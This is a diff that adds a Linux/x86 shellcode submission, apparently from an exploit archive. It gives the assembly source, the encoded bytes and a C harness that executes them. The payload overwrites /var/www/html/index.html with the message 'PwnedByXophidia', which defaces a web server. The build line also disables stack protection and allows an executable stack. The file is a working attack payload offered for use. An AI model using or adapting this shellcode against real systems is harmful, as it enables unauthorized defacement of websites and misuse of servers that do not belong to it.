@@ -1,0 +1,97 @@
+/*
+;Title: Linux/x86 - Change the content of /var/www/html/index.html with your own text
+; Author: Menelet Alain
+; Contact: https://github.com/xophidia
+; Category: Shellcode
+; Architecture: Linux x86
+; Length: 87 bytes
+ 
+ 
+=================COMPILATION AND EXECUTION===============
+ 
+#nasm -f elf32 shell.asm -o shell.o <=== Making Object File
+ 
+#ld -m elf_i386 shell.o -o shell <=== Making Binary File
+ 
+#./compile.sh shell <== compile and extract hex code from the binary(
+https://github.com/xophidia/Shellcode)
+ 
+
+=================SHELLCODE(INTEL FORMAT)=================
+ 
+global _start
+
+section .text
+
+_start:
+
+; create a new file
+xor eax, eax
+push eax
+push 0x6c6d7468
+push 0x2e786564
+push 0x6e692f6c
+push 0x6d74682f
+push 0x7777772f
+push 0x7261762f
+mov ebx, esp
+mov cx, 0x2bc		; use S_IRWXG option (read, write and execute permission
+mov al, 0x8
+int 0x80
+
+; write
+mov ebx, eax ;file descriptor
+xor eax, eax
+push eax
+push 0x61696469		; text you want to write
+push 0x68706f58
+push 0x79426465
+push 0x6e776f50
+mov ecx, esp
+mov dl, 16
+mov al, 4
+int 0x80
+
+;close file
+xor eax, eax
+mov al, 6
+int 0x80
+
+;exit
+xor eax, eax
+inc eax
+int 0x80
+ 
+===================END HERE============================
+ 
+Compile with gcc with some options.
+ 
+# gcc -m32 -fno-stack-protector -z execstack shell_web.c -o shell_web
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+
+const char code[] = \
+"\x31\xc0\x50\x68\x68\x74\x6d\x6c\x68\x64\x65\x78\x2e\x68\x6c"
+"\x2f\x69\x6e\x68\x2f\x68\x74\x6d\x68\x2f\x77\x77\x77\x68\x2f"
+"\x76\x61\x72\x89\xe3\x66\xb9\xbc\x02\xb0\x08\xcd\x80\x89\xc3"
+"\x31\xc0\x50\x68\x69\x64\x69\x61\x68\x58\x6f\x70\x68\x68\x65"
+"\x64\x42\x79\x68\x50\x6f\x77\x6e\x89\xe1\xb2\x10\xb0\x04\xcd"
+"\x80\x31\xc0\xb0\x06\xcd\x80\x31\xc0\x40\xcd\x80";
+
+int main()
+{
+
+	printf("taille %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+	return 0;
+
+}
+ 
